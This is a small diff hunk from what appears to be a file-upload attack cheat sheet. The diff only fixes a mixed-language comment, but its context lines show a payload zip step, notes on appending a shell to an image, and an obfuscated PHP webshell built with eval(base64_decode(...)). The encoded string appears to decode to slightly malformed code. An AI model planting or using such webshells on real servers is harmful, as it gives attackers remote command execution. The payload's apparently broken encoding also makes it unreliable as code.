@@ -69,7 +69,7 @@ zip payload.zip payload.php
 ```bash
 # Using filters (gd image library)
 # Clean image with LSB steganography
-# Request a合法 file then append shell
+# Request a legal file then append shell
 
 # Base64 encoded webshell
 <?php eval(base64_decode('c3lzdGVtKCRfemlwKSc=')); ?>
